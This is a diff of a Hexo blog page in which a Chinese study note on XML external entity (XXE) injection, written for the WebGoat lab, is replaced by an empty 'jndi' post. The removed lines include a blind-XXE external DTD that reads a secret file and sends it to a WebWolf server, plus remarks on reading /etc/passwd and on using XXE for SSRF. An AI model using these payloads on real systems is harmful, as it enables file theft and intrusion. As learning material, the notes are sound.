@@ -22,28 +22,20 @@
     var CONFIG = {"hostname":"ctwabc.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#4A90D9","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="XML external entity injection">
+  <meta name="description" content="学习笔记">
 <meta property="og:type" content="article">
-<meta property="og:title" content="学习XXE">
-<meta property="og:url" content="http://ctwabc.github.io/2026/06/10/XXE/index.html">
+<meta property="og:title" content="jndi">
+<meta property="og:url" content="http://ctwabc.github.io/2026/06/14/jndi/index.html">
 <meta property="og:site_name" content="ctwabc&#39;s Blog">
-<meta property="og:description" content="XML external entity injection">
+<meta property="og:description" content="学习笔记">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://ctwabc.github.io/2026/06/10/XXE/xxe1.png">
-<meta property="og:image" content="http://ctwabc.github.io/2026/06/10/XXE/xxe2.png">
-<meta property="og:image" content="http://ctwabc.github.io/2026/06/10/XXE/xxe3.png">
-<meta property="og:image" content="http://ctwabc.github.io/2026/06/10/XXE/xxe4.png">
-<meta property="og:image" content="http://ctwabc.github.io/2026/06/10/XXE/xxe5.png">
-<meta property="og:image" content="http://ctwabc.github.io/2026/06/10/XXE/xxe6.png">
-<meta property="article:published_time" content="2026-06-10T01:21:37.000Z">
-<meta property="article:modified_time" content="2026-06-13T16:36:17.700Z">
+<meta property="article:published_time" content="2026-06-14T09:22:59.000Z">
+<meta property="article:modified_time" content="2026-06-14T09:22:59.574Z">
 <meta property="article:author" content="ctwabc">
 <meta property="article:tag" content="Web安全">
-<meta property="article:tag" content="XXE">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://ctwabc.github.io/2026/06/10/XXE/xxe1.png">
 
-<link rel="canonical" href="http://ctwabc.github.io/2026/06/10/XXE/">
+<link rel="canonical" href="http://ctwabc.github.io/2026/06/14/jndi/">
 
 
 <script id="page-configurations">
@@ -84,7 +76,7 @@
 <meta property="og:image" content="https://github.com/ctwabc.png">
 <meta name="twitter:card" content="summary">
 
-  <title>学习XXE | ctwabc's Blog</title>
+  <title>jndi | ctwabc's Blog</title>
   
 
 
@@ -192,7 +184,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://ctwabc.github.io/2026/06/10/XXE/">
+    <link itemprop="mainEntityOfPage" href="http://ctwabc.github.io/2026/06/14/jndi/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="https://github.com/ctwabc.png">
@@ -205,7 +197,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          学习XXE<a href="https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name_posts/XXE.md" class="post-edit-link" title="编辑" rel="noopener" target="_blank"><i class="fa fa-pencil-alt"></i></a>
+          jndi<a href="https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name_posts/jndi.md" class="post-edit-link" title="编辑" rel="noopener" target="_blank"><i class="fa fa-pencil-alt"></i></a>
         </h1>
 
         <div class="post-meta">
@@ -215,23 +207,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2026-06-10 09:21:37" itemprop="dateCreated datePublished" datetime="2026-06-10T09:21:37+08:00">2026-06-10</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-06-14 00:36:17" itemprop="dateModified" datetime="2026-06-14T00:36:17+08:00">2026-06-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
-                </span>
+              <time title="创建时间：2026-06-14 17:22:59" itemprop="dateCreated datePublished" datetime="2026-06-14T17:22:59+08:00">2026-06-14</time>
             </span>
 
           
@@ -245,64 +221,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p><em>XML external entity injection</em></p>
-<span id="more"></span>
-
-<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>有这种漏洞就是因为后端对xml没有限制，具体是什么限制后面写，所以说利用的肯定是xml的一些语法特性。</p>
-<h3 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h3><p>但其实就是DTD部分</p>
-<p><img src="/2026/06/10/XXE/xxe1.png" alt="截图"></p>
-<p>主要关注DTD</p>
-<p>在[]里面有ENTITY js “Jo Smith”</p>
-<p>js就是变量 Jo Smith就是变量的值</p>
-<p>&amp;js 就会变成Jo Smith</p>
-<p><img src="/2026/06/10/XXE/xxe2.png" alt="截图"></p>
-<p>主要关注SYSTEM</p>
-<p>SYSTEM 是一个<strong>强力关键字</strong>，它的核心作用就是：<strong>告诉 XML 解析器去“外包”或者“搬运”外部的资源</strong>。</p>
-<p>也就是说它会从后面附上的地址那数据。</p>
-<p>也就说&amp;js会得到&#x2F;etc&#x2F;passwd这个文件里面的数据。</p>
-<p>而这个xml是传给后端的，所以这个文件就是后端的文件。</p>
-<p>很显然这个SYSTEM关键字是不安全的应该禁止</p>
-<h3 id="变量的两种形式"><a href="#变量的两种形式" class="headerlink" title="变量的两种形式"></a>变量的两种形式</h3><ul>
-<li><p>通用实体</p>
-<p><img src="/2026/06/10/XXE/xxe3.png" alt="截图"></p>
-</li>
-</ul>
-<p>也就是我们在刚才一直用的形式，如图file就是变量</p>
-<p>他的变量在DTD中是不会解析的</p>
-<ul>
-<li><p>参数实体</p>
-<p><img src="/2026/06/10/XXE/xxe4.png" alt="截图"></p>
-</li>
-</ul>
-<p>先看对变量进行定义的方法，他是通过&amp; 变量名 的形式定义的（注意&amp;和变量名之间有空格）</p>
-<p>对于变量的引用是通过&amp;变量名。</p>
-<p>核心就是，变量的引用是在DTD里进行的。</p>
-<p>那这个参数实体在哪里会用到呢？</p>
-<p>他会在XXE盲注中用到</p>
-<p>首先了解一下什么是盲注，盲注就是没有回显。</p>
-<p>举个例子，上面的例子中的&#x2F;etc&#x2F;passwd文件里面的数据我们希望看到，比如说显示在前端页面什么的，但是对方后端在处理完之后没有将数据传给前端，或者只显示xml解析成功之类的，总之我们看不到数据。</p>
-<p>所以我们希望可以看到数据，既然对方的前端页面不会显示数据，我们就让他把数据传给我们，如图</p>
-<p><img src="/2026/06/10/XXE/xxe5.png" alt="截图"></p>
-<p>这个webwolf就是我们的服务器</p>
-<p>%file获取数据，添加给send的值里面</p>
-<p>%send就会将这个http协议给解析了，也就是访问这个http地址，这样我们的服务器就可以通过参数的形式看到数据了。</p>
-<p>但是，参数实体在变量的值里面是不能这么写的，因为xml解析器看到这种语法的话会直接报错罢工，也就是说%file没用。</p>
-<p>还有但是，在外部 DTD 文件（即通过网络或者本地路径引入的独立 .dtd 文件）中，参数实体允许进行自由的嵌套、拼接和调用。</p>
-<!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-2025.3/XXE/ctwabc/secret.txt">
-
-<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://webwolf:9090/WebWolf/landing?text=%file;'><p>“&gt;</p>
-<p>%all;</p>
-<p>%send;</p>
-<p>这个是外部DTD文件里面的内容，在这里可以随意嵌套。</p>
-<p><img src="/2026/06/10/XXE/xxe6.png" alt="截图"></p>
-<p>那就可以像这样使用了。还有一个疑问就是%remote后那个DTD不就在内部了吗，内部不是不能嵌套吗，可以这样写吗？</p>
-<p>可以的，因为解析起在解析的时候看到%remote他的内容是从外部过来的，就会对他进行标记，这样就允许他进行嵌套了。</p>
-<p>可以想到用XXE执行SSRF</p>
-<p>把url地址改成内网地址不就是SSRF吗。</p>
-<p>至于在内网当中的ip是什么，端口是什么，可以通过爆破来解决。</p>
-<p>参考文章: </p>
-<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/">https://drun1baby.top/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/</a></p>
-
+        
     </div>
 
     
@@ -324,10 +243,6 @@
 
 
       <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
-              <a href="/tags/XXE/" rel="tag"># XXE</a>
-          </div>
 
         
 
@@ -335,13 +250,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2026/06/09/ssrf/" rel="prev" title="SSRF 服务端请求伪造">
-      <i class="fa fa-chevron-left"></i> SSRF 服务端请求伪造
+    <a href="/2026/06/13/shiro721/" rel="prev" title="shiro721">
+      <i class="fa fa-chevron-left"></i> shiro721
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2026/06/10/FireWall/" rel="next" title="FireWall">
-      FireWall <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -400,7 +312,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XML%E8%AF%AD%E6%B3%95"><span class="nav-number">2.</span> <span class="nav-text">XML语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%BD%A2%E5%BC%8F"><span class="nav-number">3.</span> <span class="nav-text">变量的两种形式</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
